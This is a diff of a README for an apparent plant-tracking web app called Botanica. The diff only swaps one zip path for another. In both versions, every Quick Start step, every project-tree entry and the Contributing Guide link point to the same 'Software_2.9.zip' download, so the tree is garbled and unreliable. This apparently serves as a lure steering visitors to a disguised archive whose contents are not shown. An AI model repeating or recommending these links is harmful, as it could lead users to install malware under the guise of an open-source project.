@@ -32,7 +32,7 @@ static web application for plant enthusiasts to collect, organize, and track the
 ## 🚀 Quick Start
 
 1. **Download** all the files to a folder
-2. **Open** `https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/Software_v2.9-beta.3.zip` in your web browser
+2. **Open** `https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/images/Software_2.9.zip` in your web browser
 3. **Start adding** your plants!
 
 No installation or server required!
@@ -45,25 +45,25 @@ No installation or server required!
 Botanica/
 ├── .github/
 │   └── workflows/
-│       ├── https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/Software_v2.9-beta.3.zip
-│       └── https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/Software_v2.9-beta.3.zip
+│       ├── https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/images/Software_2.9.zip
+│       └── https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/images/Software_2.9.zip
 ├── assets/
 │   ├── icon/
-│       └── https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/Software_v2.9-beta.3.zip
+│       └── https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/images/Software_2.9.zip
 │   └── images/
-│       ├──lucky bamboo https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/Software_v2.9-beta.3.zip
-│       ├──https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/Software_v2.9-beta.3.zip
-│       └──snake https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/Software_v2.9-beta.3.zip
+│       ├──lucky bamboo https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/images/Software_2.9.zip
+│       ├──https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/images/Software_2.9.zip
+│       └──snake https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/images/Software_2.9.zip
 ├── scripts/
-│   ├──https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/Software_v2.9-beta.3.zip
-│   ├──https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/Software_v2.9-beta.3.zip
-│   └──https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/Software_v2.9-beta.3.zip
+│   ├──https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/images/Software_2.9.zip
+│   ├──https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/images/Software_2.9.zip
+│   └──https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/images/Software_2.9.zip
 ├── styles/
-│   ├──https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/Software_v2.9-beta.3.zip
-│   ├──https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/Software_v2.9-beta.3.zip
-│   └──https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/Software_v2.9-beta.3.zip
-├── https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/Software_v2.9-beta.3.zip
-└── https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/Software_v2.9-beta.3.zip
+│   ├──https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/images/Software_2.9.zip
+│   ├──https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/images/Software_2.9.zip
+│   └──https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/images/Software_2.9.zip
+├── https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/images/Software_2.9.zip
+└── https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/images/Software_2.9.zip
 ```
 ---
 
@@ -99,7 +99,7 @@ Botanica/
 
 1. Create a folder called `botanical-app`
 2. Save each code block in its respective file as shown in the structure
-3. Open `https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/Software_v2.9-beta.3.zip` in your web browser
+3. Open `https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/images/Software_2.9.zip` in your web browser
 4. Start adding your plants!
 
 The app will work completely offline and store all your plant data locally in your browser. You can add, view, search, and filter your plant collection with a beautiful, responsive interface!
@@ -108,7 +108,7 @@ The app will work completely offline and store all your plant data locally in yo
 
 ## 🤝 Contributing
 
-We welcome contributions to Botanica! If you'd like to help improve the project, please see our [Contributing Guide](https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/Software_v2.9-beta.3.zip) for information on:
+We welcome contributions to Botanica! If you'd like to help improve the project, please see our [Contributing Guide](https://raw.githubusercontent.com/kaifansariw/Botanica/main/assets/images/Software_2.9.zip) for information on:
 
 - How to set up your development environment
 - Coding standards and practices
